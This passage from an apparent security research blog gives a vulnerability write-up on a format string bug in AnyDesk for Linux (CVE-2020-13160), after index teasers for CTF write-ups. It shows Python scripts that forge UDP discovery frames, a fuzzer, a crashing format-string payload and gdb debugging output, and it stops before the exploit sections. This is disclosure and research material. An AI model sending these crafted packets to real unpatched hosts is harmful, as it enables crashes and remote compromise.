→[Actual ASLR 2](#aaslr2)
    – [Custom Heap](#heap)
    – [Vulnerability](#vuln)
    – [Heap Leak](#heapleak)
    – [Image Base Leak](#imgleak)
    – [Overwriting Function Pointer](#overwrite)
    – [Final Exploit](#final)

---

[Continue reading “ALLES! CTF 2020 – Actual ASLR 1/2”](https://devel0pment.de/?p=2027#more-2027)

Posted on [9. June 202015. June 2020](https://devel0pment.de/?p=1881)
### [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881)

![](https://devel0pment.de/wp-content/uploads/2020/06/cve.png)

One of my goals for this year is to spend a little bit more of my spare time on real world applications. Doing so I took a look at the remote desktop application [AnyDesk](https://anydesk.com/), which seems to quickly raise in popularity not only because of COVID-19. AnyDesk is available for a variety of operating systems including Windows, Linux, Android and iOS. By reversing and fuzzing the Linux version 5.5.2 of the application I was able to find a format string vulnerability, which can be used to gain Remote Code Execution (RCE) by sending a single UDP packet to the target machine. AnyDesk took the issue very seriously. They released a patch only three days after my notification (5.5.3) and paid me a bounty of 5.000 EUR. The vulnerability is tracked as [CVE-2020-13160](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13160). Within this article I want to share all steps, which were involved in finding the vulnerability, understanding the bug and developing the RCE exploit. The article is divided into the following sections:

→ [Fuzzing](https://devel0pment.de/?p=1881#fuzzing)

→ [Bug](https://devel0pment.de/?p=1881#bug)

→ [Exploit](https://devel0pment.de/?p=1881#exploit)

    – [Strategy](https://devel0pment.de/?p=1881#strategy)

    – [The v in vsnprintf](https://devel0pment.de/?p=1881#vsnprintf)

    – [Gaining arbitrary write](https://devel0pment.de/?p=1881#write)

    – [Controlling the instruction pointer](https://devel0pment.de/?p=1881#ip)

    – [Hitting our shellcode: dynamic field width](https://devel0pment.de/?p=1881#shellcode)

    – [Final exploit](https://devel0pment.de/?p=1881#final)

→ [Conclusion](https://devel0pment.de/?p=1881#conclusion)

[Continue reading “AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)”](https://devel0pment.de/?p=1881#more-1881)

Posted on [23. May 202024. May 2020](https://devel0pment.de/?p=1593)
### [Hack The Box – Rope](https://devel0pment.de/?p=1593)

![](https://devel0pment.de/wp-content/uploads/2019/01/htb.png)

This article contains my writeup on the machine `Rope` from [Hack The Box](https://www.hackthebox.eu/). I really enjoyed the box, since it provides a total of three custom binaries, which are supposed to be exploited 🙂

![](https://devel0pment.de/wp-content/uploads/2019/10/htb_rope.png)

The article is divided into the following parts:

→ [User](https://devel0pment.de/?p=1593#user)
    – [Initial Recon](https://devel0pment.de/?p=1593#recon)
    – [httpserver](https://devel0pment.de/?p=1593#httpserver)
    – [Leak Memory Address](https://devel0pment.de/?p=1593#leak)
    – [Exploit Format String Vulnerability](https://devel0pment.de/?p=1593#fmt)
    – [Escalating from john to r4j (readlogs)](https://devel0pment.de/?p=1593#user_escalate)

→ [Root](https://devel0pment.de/?p=1593#root)
    – [Local Recon](https://devel0pment.de/?p=1593#recon2)
    – [contact](https://devel0pment.de/?p=1593#contact)
    – [Bruteforce](https://devel0pment.de/?p=1593#bruteforce)
    – [Libc Leak](https://devel0pment.de/?p=1593#libcleak)
    – [Final Exploit](https://devel0pment.de/?p=1593#finalexploit)

[Continue reading “Hack The Box – Rope”](https://devel0pment.de/?p=1593#more-1593)

Posted on [1. January 20201. January 2020](https://devel0pment.de/?p=1663)
### [HACKvent19 writeup](https://devel0pment.de/?p=1663)

|  | This year’s **HACKvent** was hosted on the brand new [Hacking-Lab 2.0](https://academy.hacking-lab.com/) plattform. Each day from the 1st of december until the 24th a new challenge is published raising in difficulty. The flag format changed from `HV18-xxxx-xxxx-xxxx-xxxx-xxxx` to `HV19{...}`. After all I managed to solve all 28 challenges 🙂 |
| --- | --- |

|  | Hidden |
| --- | --- |
| [**HV19.H1** Hidden One](https://devel0pment.de/?p=1663#chlgHV19.H1)[**HV19.H2** Hidden Two](https://devel0pment.de/?p=1663#chlgHV19.H2)[**HV19.H3** Hidden Three](https://devel0pment.de/?p=1663#chlgHV19.H3)[**HV19.H4** Hidden Four](https://devel0pment.de/?p=1663#chlgHV19.H4) | |
|  | Easy |
| [**HV19.01** censored](https://devel0pment.de/?p=1663#chlgHV19.01)[**HV19.02** Triangulation](https://devel0pment.de/?p=1663#chlgHV19.02)[**HV19.03** Hodor, Hodor, Hodor](https://devel0pment.de/?p=1663#chlgHV19.03)[**HV19.04** password policy circumvention](https://devel0pment.de/?p=1663#chlgHV19.04)[**HV19.05** Santa Parcel Tracking](https://devel0pment.de/?p=1663#chlgHV19.05)[**HV19.06** bacon and eggs](https://devel0pment.de/?p=1663#chlgHV19.06)[**HV19.07** Santa Rider](https://devel0pment.de/?p=1663#chlgHV19.07) | |
|  | Medium |
| [**HV19.08** SmileNcryptor 4.0](https://devel0pment.de/?p=1663#chlgHV19.08)[**HV19.09** Santas Quick Response 3.0](https://devel0pment.de/?p=1663#chlgHV19.09)[**HV19.10** Guess what](https://devel0pment.de/?p=1663#chlgHV19.10)[**HV19.11** Frolicsome Santa Jokes API](https://devel0pment.de/?p=1663#chlgHV19.11)[**HV19.12** back to basic](https://devel0pment.de/?p=1663#chlgHV19.12)[**HV19.13** TrieMe](https://devel0pment.de/?p=1663#chlgHV19.13)[**HV19.14** Achtung das Flag](https://devel0pment.de/?p=1663#chlgHV19.14) | |
|  | Hard |
| [**HV19.15** Santa’s Workshop](https://devel0pment.de/?p=1663#chlgHV19.15)[**HV19.16** B0rked Calculator](https://devel0pment.de/?p=1663#chlgHV19.16)[**HV19.17** Unicode Portal](https://devel0pment.de/?p=1663#chlgHV19.17)[**HV19.18** Dance with me](https://devel0pment.de/?p=1663#chlgHV19.18)[**HV19.19** U+1F385](https://devel0pment.de/?p=1663#chlgHV19.19)[**HV19.20** i want to play a game](https://devel0pment.de/?p=1663#chlgHV19.20)[**HV19.21** Happy Christmas 256](https://devel0pment.de/?p=1663#chlgHV19.21) | |
|  | Leet |
| [**HV19.22** The command … is lost](https://devel0pment.de/?p=1663#chlgHV19.22)[**HV19.23** Internet Data Archive](https://devel0pment.de/?p=1663#chlgHV19.23)[**HV19.24** ham radio](https://devel0pment.de/?p=1663#chlgHV19.24) | |

[Continue reading “HACKvent19 writeup”](https://devel0pment.de/?p=1663#more-1663)

## Posts navigation

Page 1
[Page 2](https://devel0pment.de/?paged=2)
…
[Page 4](https://devel0pment.de/?paged=4)
[Next page](https://devel0pment.de/?paged=2)

Search for:

Search

## Pages

* [About](https://devel0pment.de/?page_id=2665)
* [Contact](https://devel0pment.de/?page_id=2)

## Recent Posts

* [Hack The Box – Response](https://devel0pment.de/?p=2594)
* [From Single / Double Quote Confusion To RCE (CVE-2022-24637)](https://devel0pment.de/?p=2494)
* [ASIS CTF Quals 2021 – ASCII art a a service](https://devel0pment.de/?p=2431)
* [Hacky Easter 2021 writeup](https://devel0pment.de/?p=2282)
* [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)
## Recent Comments

* scryh on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4174)
* [m3dsec](https://m3dsec.github.io/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4173)
* [TobjasR](https://www.linkedin.com/in/tobjasr/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-3704)
* scryh on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3411)
* Tomer on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3408)
## Archives

* [February 2023](https://devel0pment.de/?m=202302)
* [March 2022](https://devel0pment.de/?m=202203)
* [October 2021](https://devel0pment.de/?m=202110)
* [May 2021](https://devel0pment.de/?m=202105)
* [April 2021](https://devel0pment.de/?m=202104)
* [January 2021](https://devel0pment.de/?m=202101)
* [September 2020](https://devel0pment.de/?m=202009)
* [June 2020](https://devel0pment.de/?m=202006)
* [May 2020](https://devel0pment.de/?m=202005)
* [January 2020](https://devel0pment.de/?m=202001)
* [July 2019](https://devel0pment.de/?m=201907)
* [June 2019](https://devel0pment.de/?m=201906)
* [March 2019](https://devel0pment.de/?m=201903)
* [February 2019](https://devel0pment.de/?m=201902)
* [January 2019](https://devel0pment.de/?m=201901)
* [August 2018](https://devel0pment.de/?m=201808)
* [July 2018](https://devel0pment.de/?m=201807)
* [May 2018](https://devel0pment.de/?m=201805)
* [March 2018](https://devel0pment.de/?m=201803)
* [February 2018](https://devel0pment.de/?m=201802)
* [January 2018](https://devel0pment.de/?m=201801)
## Categories

* [article](https://devel0pment.de/?cat=29)
* [ctf](https://devel0pment.de/?cat=24)
* [Hack The Box](https://devel0pment.de/?cat=32)
* [Hacking-Lab.com](https://devel0pment.de/?cat=25)
* [RPISEC/MBE](https://devel0pment.de/?cat=26)
* [writeup](https://devel0pment.de/?cat=7)
## Meta

* [Log in](https://devel0pment.de/wp-login.php)
* [Entries feed](https://devel0pment.de/?feed=rss2)
* [Comments feed](https://devel0pment.de/?feed=comments-rss2)
* [WordPress.org](https://wordpress.org/)

[Proudly powered by WordPress](https://wordpress.org/)

We use cookies to ensure that we give you the best experience on our website. If you continue to use this site we will assume that you are happy with it.OkNo



=== Content from devel0pment.de_1a14c894_20250119_142601.html ===

[Skip to content](#content)
![](https://devel0pment.de/wp-content/uploads/2018/03/cropped-dev_05.png)

[devel0pment.de](https://devel0pment.de/)

software, offensive security research

Posted on [9. June 202015. June 2020](https://devel0pment.de/?p=1881) by [scryh](https://devel0pment.de/?author=1)
# AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)

![](https://devel0pment.de/wp-content/uploads/2020/06/cve.png)

One of my goals for this year is to spend a little bit more of my spare time on real world applications. Doing so I took a look at the remote desktop application [AnyDesk](https://anydesk.com/), which seems to quickly raise in popularity not only because of COVID-19. AnyDesk is available for a variety of operating systems including Windows, Linux, Android and iOS. By reversing and fuzzing the Linux version 5.5.2 of the application I was able to find a format string vulnerability, which can be used to gain Remote Code Execution (RCE) by sending a single UDP packet to the target machine. AnyDesk took the issue very seriously. They released a patch only three days after my notification (5.5.3) and paid me a bounty of 5.000 EUR. The vulnerability is tracked as [CVE-2020-13160](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13160). Within this article I want to share all steps, which were involved in finding the vulnerability, understanding the bug and developing the RCE exploit. The article is divided into the following sections:

→ [Fuzzing](https://devel0pment.de/?p=1881#fuzzing)

→ [Bug](https://devel0pment.de/?p=1881#bug)

→ [Exploit](https://devel0pment.de/?p=1881#exploit)

    – [Strategy](https://devel0pment.de/?p=1881#strategy)

    – [The v in vsnprintf](https://devel0pment.de/?p=1881#vsnprintf)

    – [Gaining arbitrary write](https://devel0pment.de/?p=1881#write)

    – [Controlling the instruction pointer](https://devel0pment.de/?p=1881#ip)

    – [Hitting our shellcode: dynamic field width](https://devel0pment.de/?p=1881#shellcode)

    – [Final exploit](https://devel0pment.de/?p=1881#final)

→ [Conclusion](https://devel0pment.de/?p=1881#conclusion)

---

# Fuzzing

The AnyDesk application is running multiple processes with different permissions. The most valuable target is the service process `/usr/bin/anydesk --service`, since this process is running with `root` privileges. There are two older CVEs ([CVE-2017-14397](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14397) and [CVE-2018-13102](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13102)), which target this process on Windows in order to escalate privileges. Both of these exploits are DLL injection/preloading vulnerabilities, which only work locally. My desire was to find a vulnerability, which can be exploited remotely.

At first we need to figure out which remote communication with the AnyDesk application is possible. This can simply be done by starting the application and using `netstat` to determine on which ports the application is listening:

```

user@w00d:~$ sudo netstat -tulpn | grep anydesk
tcp        0      0 0.0.0.0:7070            0.0.0.0:*               LISTEN      598/anydesk
udp        0      0 0.0.0.0:50001           0.0.0.0:*                           598/anydesk

```

Accordingly the application is listening on TCP port `7070` and UDP port `50001`. By displaying all anydesk processes, we can see that the listening process is the service process itself (PID `598`). Also recognize the traybar process (PID `2983`) as well as the front-end process (PID `3421`):

```

user@w00d:~$ sudo ps aux | grep anydesk
root       598  0.0  0.3 531172 28620 ?        Ssl  08:56   0:02 /usr/bin/anydesk --service
user      2983  0.0  0.2 744288 23736 tty2     Sl+  08:58   0:00 /usr/bin/anydesk --tray
user      3421  0.0  0.4 864624 37760 tty2     Sl+  09:01   0:00 /usr/bin/anydesk

```

Before we can reasonably fuzz the application, we have to determine what data the application is usually expecting to receive on these ports. In order to get some sample data, we can inspect all traffic related to these ports using `wireshark` while interacting with the application.

According to the observations we can make with wireshark TCP port 7070 is used for the actual remote desktop connection and uses TLS to encrypt the traffic. The details are not relevant for our considerations here. The relevant port is UDP 50001, which is used to announce AnyDesk clients within a local network. On startup of AnyDesk we can see that our client sends UDP packets to `239.255.102.18` in order to announce its presence. The packet contains the hostname (`w00d`), the username (`scryh`), a profile picture as well as a few other information:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_01.png)

Assuming that these announcements are also processed by our own client, we now have some legitimate data in order to fuzz the application. At first I started by fuzzing the application using [fuzzotron](https://github.com/denandz/fuzzotron), which is written in C and is quite fast. fuzzotron uses [radamsa](https://gitlab.com/akihe/radamsa) and/or [blab](https://github.com/aoh/blab) for the mutation of the input data. The setup is straightforward. We simply put our initial data observed in wireshark in a test-case file and then run fuzzotron providing among others the IP address and port as well as the PID, which fuzzotron should monitor for possible crashes.

Unfortunately I could not find any flaws that seemed to be exploitable. So I decided to change the approach. Instead of directly targeting the service process, which is listening on the network socket, we can focus on the front-end process (PID `2983` in the output above). The front-end process is responsible for displaying the GUI to the user and communicates with the service process to exchange information relevant for the GUI. When the service process receives a valid UDP announcement frame this frame is passed to the front-end process in order to display the announced device within the GUI:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_02.png)

To make our fuzzing input reach the front-end process we have to send valid announcement frames. The problem here is that most of the frames produced by the fuzzer we used so far are not valid, because there are mutated without any knowledge of the specific format of these frames. Accordingly most of the fuzzer-mutated frames are dropped by the service process and never reach the front-end process.

In order to create valid announcement frames we have to understand how the frames are built. Fortunately the format is not very complicated. By changing settings like our username or hostname and then observing the corresponding announcement frames our client is sending, we can derive how the frames are built. Among other things a frame contains the AnyDesk ID (4-byte), an operating system ID (1-byte) as well as the hostname and username, which are both transmitted as a 4-byte length field (`big-endian`) followed by the actual data. There are a few other fields and static values, which are not relevant for our considerations. The following python script creates a valid frame based on the given parameters and sends it to our local machine on UDP port 50001:

```

#!/usr/bin/env python

import struct
import socket

ip = '127.0.0.1'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

p = gen_discover_packet(4919, 1, 'custom host', 'custom username', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()

```

After running the script we can see in the GUI that the front-end received the announcement and the fake device is displayed:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_03.png)

Now we are ready to explicitly fuzz certain fields of the frame. In order to do this we extend the python script to serve as our fuzzer. We can generate the actual fuzzing input by using radamsa again. Also we will monitor the front-end process and dump the last 10 fuzzing inputs, if the process died. The full fuzzer script, which targets the hostname, looks like this:

```

#!/usr/bin/env python

import struct
import socket
import subprocess
import psutil
import os
import time

ip = '127.0.0.1'
port = 50001
host_payloads = [''] * 10
dump_idx = 0

def mutate(pl):
  p = subprocess.Popen(['/usr/bin/radamsa', '-'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
  return p.communicate(pl)[0]

def isAlive():
  for p in psutil.process_iter():
    if (p.name() == 'anydesk' and len(p.cmdline()) == 1): return True
  return False

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

def dump():
  global dump_idx
  print('dumping '+str(dump_idx))
  os.system('mkdir loot'+str(dump_idx))
  for i in range(len(host_payloads)):
    f = open('./loot'+str(dump_idx)+'/host_payload'+str(i), 'wb')
    f.write(host_payloads[i])
    f.close()
  dump_idx += 1
  os.system('anydesk&')
  time.sleep(5)

idx = 0
while True:
  time.sleep(5.0)
  host = mutate('host')
  if (len(host) > 45000): continue # max length
  host_payloads[idx%len(host_payloads)] = host
  p = gen_discover_packet(4919, 2, host, 'user', 'ad', 'main')
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.sendto(p, (ip, port))
  s.close()
  idx += 1
  if (not isAlive()): dump()

```

The sleep time for each fuzzing iteration is quite high (5 seconds), but it turned out that the GUI is only updated every 5 seconds. At first I thought about patching the binary in order to increase the update interval, but before digging into this I decided to just let the fuzzer run over a night.

At the next day the fuzzing results were ready to be evaluated. The front-end actually crashed a few times and the script stored the fuzzing inputs on disk. At first we need to determine which exact payload triggered the crash. Since we saved the last 10 payloads sent to the application, we just need to resend these payloads and determine which one makes the application crash. This can be done using the following script:

```

#!/usr/bin/env python

import struct
import socket
import sys

ip = '127.0.0.1'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  ...

host = open(sys.argv[1]).read()
p = gen_discover_packet(4919, 2, host, 'user', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()

```

By sending the following payload the front-end crashes:

```

user@w00d:~$ ./resend.py loot2/host_payload4

... crash ...

user@w00d:~$ hexdump -C loot2/host_payload4
00000000  61 61 61 61 25 64 25 6e  25 70 25 64 24 2b f3 a0  |aaaa%d%n%p%d$+..|
00000010  81 9c 81 bd 0b 7c                                 |.....||
00000016

```

By fuzzing the AnyDesk front-end process with a python script, which produces valid announcement frames and mutates the hostname using radamsa, we successfully generated an input, which crashes the application. The next step is to analyze the bug in order the determine, if we can exploit it.

# Bug

So far we have fuzzed the AnyDesk front-end and identified an input which makes the front-end crash. The next step is to determine what the cause of this crash is and to examine if it is based on a bug which we can exploit.

At first we start up the front-end again and attach gdb to it (the `pid_frontend.py` script merely retrieves the current `PID` of the front-end process):

```

root@w00d:~# gdb /usr/bin/anydesk $(~/pid_frontend.py)

...
Reading symbols from /usr/bin/anydesk...(no debugging symbols found)...done.
Attaching to program: /usr/bin/anydesk, process 10911
[New LWP 10913]
[New LWP 10914]
[New LWP 10928]
[New LWP 10931]
[New LWP 10938]
[New LWP 10941]
[New LWP 10942]
[New LWP 10943]
[New LWP 10944]
[New LWP 10945]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

[----------------------------------registers-----------------------------------]
RAX: 0xfffffffffffffdfc
RBX: 0x1cf7720 --> 0x100000005
RCX: 0x7f491870ebf9 (<__GI___poll+73>:	cmp    rax,0xfffffffffffff000)
RDX: 0x37a0
RSI: 0x3
RDI: 0x1cf7720 --> 0x100000005
RBP: 0x3
RSP: 0x7ffe12cbcfb0 --> 0x1aa05cc --> 0x2
RIP: 0x7f491870ebf9 (<__GI___poll+73>:	cmp    rax,0xfffffffffffff000)
R8 : 0x0
R9 : 0x1ab6720 --> 0x1900000024
R10: 0x1ce3000 --> 0x1ab6720 --> 0x1900000024
R11: 0x293
R12: 0x37a0
R13: 0x37a0
R14: 0x7f491d0b9f70 (<g_poll>:	mov    esi,esi)
R15: 0x3
EFLAGS: 0x293 (CARRY parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7f491870ebef <__GI___poll+63>:	mov    rdi,rbx
   0x7f491870ebf2 <__GI___poll+66>:	mov    eax,0x7
   0x7f491870ebf7 <__GI___poll+71>:	syscall
=> 0x7f491870ebf9 <__GI___poll+73>:	cmp    rax,0xfffffffffffff000
   0x7f491870ebff <__GI___poll+79>:	ja     0x7f491870ec32 <__GI___poll+130>
   0x7f491870ec01 <__GI___poll+81>:	mov    edi,r8d
   0x7f491870ec04 <__GI___poll+84>:	mov    DWORD PTR [rsp+0xc],eax
   0x7f491870ec08 <__GI___poll+88>:	call   0x7f491872a740 <__libc_disable_asynccancel>
[------------------------------------stack-------------------------------------]
0000| 0x7ffe12cbcfb0 --> 0x1aa05cc --> 0x2
0008| 0x7ffe12cbcfb8 --> 0x1cf7720 --> 0x100000005
0016| 0x7ffe12cbcfc0 --> 0x1957be0 --> 0x0
0024| 0x7ffe12cbcfc8 --> 0x3
0032| 0x7ffe12cbcfd0 --> 0x1cf7720 --> 0x100000005
0040| 0x7ffe12cbcfd8 --> 0x7f491d0aa5c9 (mov    r13d,eax)
0048| 0x7ffe12cbcfe0 --> 0x0
0056| 0x7ffe12cbcfe8 --> 0x101957be0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00007f491870ebf9 in __GI___poll (fds=0x1cf7720, nfds=0x3, timeout=0x37a0) at ../sysdeps/unix/sysv/linux/poll.c:29
29	../sysdeps/unix/sysv/linux/poll.c: No such file or directory.
gdb-peda$ c
Continuing.

```

Now we resend the payload, which caused the crash:

```

user@w00d:~$ ./resend.py loot2/host_payload4

```

As expected the application raises a segmentation fault:

```

Thread 1 "anydesk" received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x7ffe12cbb800 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'")
RCX: 0x0
RDX: 0x7ffe12cbc4f8 --> 0x0
RSI: 0x7ffe12cbb568 --> 0xd24f18983b49a900
RDI: 0x7ffe12cbb5b0 --> 0x7ffefbad8001
RBP: 0x7ffe12cbb5a0 --> 0x7ffe12cbbc00 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa30849456\275\313\022\376\177")
RSP: 0x7ffe12cbb030 --> 0x7f491ec3a6f0 (<gtk_widget_destroy>:	push   rbx)
RIP: 0x7f4918657932 (<_IO_vfprintf_internal+9634>:	mov    DWORD PTR [rax],r13d)
R8 : 0x0
R9 : 0x0
R10: 0x0
R11: 0x7ffe12cbb88c --> 0xf32b24642570256e
R12: 0x7ffe12cbc4c8 --> 0x3000000020 (' ')
R13: 0x91
R14: 0x7ffe12cbb5b0 --> 0x7ffefbad8001
R15: 0x6e ('n')
EFLAGS: 0x10212 (carry parity ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7f4918657928 <_IO_vfprintf_internal+9624>:	add    eax,0x8
   0x7f491865792b <_IO_vfprintf_internal+9627>:	mov    DWORD PTR [r12],eax
   0x7f491865792f <_IO_vfprintf_internal+9631>:	mov    rax,QWORD PTR [rdx]
=> 0x7f4918657932 <_IO_vfprintf_internal+9634>:	mov    DWORD PTR [rax],r13d
   0x7f4918657935 <_IO_vfprintf_internal+9637>:	jmp    0x7f4918655930 <_IO_vfprintf_internal+1440>
   0x7f491865793a <_IO_vfprintf_internal+9642>:	mov    QWORD PTR [rbp-0x4e8],r11
   0x7f4918657941 <_IO_vfprintf_internal+9649>:	mov    QWORD PTR [rbp-0x4e0],rax
   0x7f4918657948 <_IO_vfprintf_internal+9656>:	call   0x7f4918684150 <_IO_vtable_check>
[------------------------------------stack-------------------------------------]
0000| 0x7ffe12cbb030 --> 0x7f491ec3a6f0 (<gtk_widget_destroy>:	push   rbx)
0008| 0x7ffe12cbb038 --> 0x0
0016| 0x7ffe12cbb040 --> 0x7ffe12cbb88a ("d%n%p%d$+\201\275\v|'")
0024| 0x7ffe12cbb048 --> 0x7ffe00000000
0032| 0x7ffe12cbb050 --> 0x0
0040| 0x7ffe12cbb058 --> 0x1
0048| 0x7ffe12cbb060 --> 0xffffffffffffffff
0056| 0x7ffe12cbb068 --> 0x100000000
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00007f4918657932 in _IO_vfprintf_internal (s=s@entry=0x7ffe12cbb5b0,
    format=format@entry=0x7ffe12cbb800 "Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'", ap=ap@entry=0x7ffe12cbc4c8) at vfprintf.c:1642
1642	vfprintf.c: No such file or directory.

```

As we can see, the crash is caused by the instruction `mov DWORD PTR [rax], r13d` within the function `_IO_vfprintf_internal`. Since the value of `rax` is `0` a segmentation fault is raised. Using the command `bt` we can print the stacktrace:

```

gdb-peda$ bt
#0  0x00007f4918657932 in _IO_vfprintf_internal (s=s@entry=0x7ffe12cbb5b0,
    format=format@entry=0x7ffe12cbb800 "Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'", ap=ap@entry=0x7ffe12cbc4c8) at vfprintf.c:1642
#1  0x00007f4918682910 in _IO_vsnprintf (
    string=0x7ffe12cbbc00 "Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa30849456\275\313\022\376\177", maxlen=<optimized out>,
    format=0x7ffe12cbb800 "Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'", args=0x7ffe12cbc4c8) at vsnprintf.c:114
#2  0x00000000008ab34b in ?? ()
#3  0x00000000008aba98 in ?? ()
#4  0x0000000000434395 in ?? ()
#5  0x00007f491d0b11cd in g_logv () from /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0
#6  0x00007f491d0b133f in g_log () from /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0
...

```

According to the output the return address after the `vsnprintf` call is `0x8ab34b` (`#2`). Let’s examine the code at this address in `ghidra`:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_04.png)

The call to `vsnprintf` is at `0x8ab346`. The third parameter of the function is the format string to be used (`local_cb8`). A few lines before we can see that the fourth parameter of the outer function (`param_4`) is copied into `local_cb8` using `strncpy`. In order to determine which parameters were passed to `vsnprintf` let’s set a breakpoint on the call and resend the payload:

```

gdb-peda$ b *0x8ab346
Breakpoint 1 at 0x8ab346
gdb-peda$ c
Continuing.

```

```

user@w00d:~$ ./resend.py loot2/host_payload4

```

```

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x11c5040 --> 0x21 ('!')
RCX: 0x7ffec15e4248 --> 0x3000000010
RDX: 0x7ffec15e3580 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'")
RSI: 0x400
RDI: 0x7ffec15e3980 --> 0x7
RBP: 0x5
RSP: 0x7ffec15e34a0 --> 0x7ffec15e3670 --> 0x0
RIP: 0x8ab346 (call   0x412d90 <vsnprintf@plt>)
R8 : 0x0
R9 : 0x10
R10: 0xffffffa0
R11: 0x7fb9b72f9550 --> 0xfff08320fff08310
R12: 0x7ffec15e4248 --> 0x3000000010
R13: 0xb366d8 --> 0x62696c67 ('glib')
R14: 0x2475ec0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'")
R15: 0x4
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffec15e3980 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffec15e3580 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 56: Invalid UTF-8 encoded text in name - not valid 'aaaa%d%n%p%d$+\201\275\v|'")
arg[3]: 0x7ffec15e4248 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffec15e34a0 --> 0x7ffec15e3670 --> 0x0
0008| 0x7ffec15e34a8 --> 0x7ffec15e3600 ("lid 'aaaa%d%n%p%d$+\201\275\v|'")
0016| 0x7ffec15e34b0 --> 0x25ed450 --> 0x0
0024| 0x7ffec15e34b8 --> 0x7ffec15e3600 ("lid 'aaaa%d%n%p%d$+\201\275\v|'")
0032| 0x7ffec15e34c0 --> 0x7ffec15e3820 --> 0x0
0040| 0x7ffec15e34c8 --> 0x7fb9bbbe89d4 (<g_hash_table_lookup+52>:	mov    r8d,0x2)
0048| 0x7ffec15e34d0 --> 0x23e8230 --> 0x2253ab0 --> 0x2244340 --> 0x31 ('1')
0056| 0x7ffec15e34d8 --> 0x2622e60 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

